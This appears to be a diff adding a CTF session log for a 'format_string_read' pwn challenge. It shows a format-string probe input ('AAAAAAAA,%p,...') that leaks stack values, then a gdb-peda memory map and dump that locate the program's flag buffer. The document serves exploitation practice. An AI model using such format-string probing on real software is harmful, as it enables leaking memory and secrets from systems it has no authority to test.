@@ -1,0 +1,48 @@
+mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_Read/format_string_read$ ./format_string_read 
+Enter your name
+AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+AAAAAAAA,0x7fffffffdde0,0x20,0x7ffff7af2031,0xf,(nil),0xc2,0x405260,0x4141414141414141�����
+
+
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Read/format_string_read/format_string_read
+0x00401000         0x00402000         r-xp	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Read/format_string_read/format_string_read
+0x00402000         0x00403000         r--p	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Read/format_string_read/format_string_read
+0x00403000         0x00404000         r--p	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Read/format_string_read/format_string_read
+0x00404000         0x00405000         rw-p	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Read/format_string_read/format_string_read
+0x00405000         0x00426000         rw-p	[heap]
+0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dc9000 0x00007ffff7dcd000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcd000 0x00007ffff7dcf000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcf000 0x00007ffff7dd3000 rw-p	mapped
+0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7fd3000 0x00007ffff7fd5000 rw-p	mapped
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+gdb-peda$ x/80gx 0x404000
+0x404000:	0x0000000000403e20	0x00007ffff7ffe170
+0x404010:	0x00007ffff7dea8f0	0x00007ffff7a62970
+0x404020:	0x0000000000401040	0x00007ffff7a6a470
+0x404030:	0x0000000000401060	0x00007ffff7ac64f0
+0x404040:	0x00007ffff7af2020	0x00007ffff7a60ad0
+0x404050:	0x00007ffff7a60de0	0x00000000004010b0
+0x404060:	0x0000000000000000	0x0000000000000000
+0x404070:	0x0000000000000000	0x0000000000000000
+0x404080 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dce760	0x0000000000000000
+0x404090 <stdin@@GLIBC_2.2.5>:	0x00007ffff7dcda00	0x0000000000000000
+0x4040a0 <flag>:	0x3131317b67616c66	0x3131313131313131
+0x4040b0 <flag+16>:	0x3131313131313131	0x000000000a7d3131
+0x4040c0 <flag+32>:	0x0000000000000000	0x0000000000000000
+0x4040d0 <flag+48>:	0x0000000000000000	0x0000000000000000
+0x4040e0:	0x0000000000000000	0x0000000000000000
+0x4040f0:	0x0000000000000000	0x0000000000000000
+.flag
+
